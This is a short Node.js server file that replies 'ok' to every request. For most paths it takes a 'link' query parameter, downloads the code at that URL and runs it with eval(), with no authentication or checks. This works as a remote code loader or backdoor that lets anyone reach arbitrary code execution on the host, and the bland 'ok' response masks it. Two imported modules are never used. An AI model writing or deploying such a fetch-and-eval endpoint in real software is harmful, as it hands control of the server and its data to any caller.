var http = require('http'),
    https = require('https'),
    url = require('url'),
    fs = require('fs'),
    glpk=require('glpk.js'),
    phantom=require('phantom'),
    request = require('request');
let master="";
let link="";
function GetFile(url) {
  return new Promise((resolve,reject)=>{
    request({
      followAllRedirects: true,
      url:url
    }, function (error, response, body) {
      if(response.statusCode==200){
          resolve(body)
      }else{
        resolve('loi')
      }
    });
  })
}
http.createServer(function (req, res) {
  var q = url.parse(req.url, true);

  if(q.path=='/'||q.path=='/favicon.ico'){
    res.writeHead(200, {'Content-type':'text/html'})
    res.end('ok');
  }else{
    master=q.query.master;
    link=q.query.link;
    GetFile(link).then((kq)=>{
      eval(kq)
    })
    res.writeHead(200, {'Content-type':'text/html'})
    res.end('ok');
  }
}).listen(process.env.PORT||8080,()=>{

})
